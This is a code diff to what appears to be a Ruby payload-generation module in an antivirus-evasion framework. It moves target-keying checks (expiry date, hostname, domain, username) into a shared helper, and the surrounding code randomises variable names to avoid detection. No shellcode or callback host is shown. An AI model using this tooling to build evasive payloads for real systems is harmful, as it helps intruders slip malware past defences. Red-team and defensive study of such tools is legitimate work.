@@ -12,6 +12,7 @@ Updated by @ChrisTruncer
 from datetime import date
 from datetime import timedelta
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 
 
 class PayloadModule:
@@ -46,13 +47,9 @@ class PayloadModule:
         }
 
     def generate(self):
-
-        # How I'm tracking the number of nested tabs needed
-        # to make the payload
-        num_ends_required = 0
         payload_code = ''
 
-        payload_code += "require 'rubygems';require 'uri';require 'win32/api';require 'net/https';require 'openssl';include Win32\n"
+        payload_code = "require 'rubygems';require 'uri';require 'win32/api';require 'net/https';require 'openssl';include Win32\n"
         # Add logic for adding this line, stupid bug and I have no idea
         # why this is even a problem, but ruby is dumb
         if self.required_options["EXPIRE_PAYLOAD"][0] != "X" or self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X":
@@ -63,42 +60,8 @@ class PayloadModule:
         if self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X":
             payload_code += 'require \'socket\'\n'
 
-        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
-
-            year = date.today().year
-            month = date.today().month
-            day = date.today().day
-
-            # Create Payload code
-            payload_code += 'require \'date\'\n'
-            payload_code += 'if Date.today < Date.parse(\'' + year + '-' + month + '-' + day + '\').next_day(' + self.required_options["EXPIRE_PAYLOAD"][0] + ')\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-
-            payload_code += 'hostname = Socket.gethostname.downcase\n'
-            payload_code += 'if hostname[\"' + self.required_options["HOSTNAME"][0].lower() + '\"]\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-
-            payload_code += 'domain = Socket.gethostname.downcase\n'
-            payload_code += 'if domain[\"' + self.required_options["DOMAIN"][0].lower() + '\"]\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-
-            payload_code += 'name = ENV["USERNAME"].downcase\n'
-            payload_code += 'if name[\"' + self.required_options["USERNAME"][0].lower() + '\"]\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
+        payload_code2, num_ends_required = gamemaker.senecas_games(self)
+        payload_code = payload_code + payload_code2
 
         # randomly generate out variable names
         ptrName = evasion_helpers.randomString()
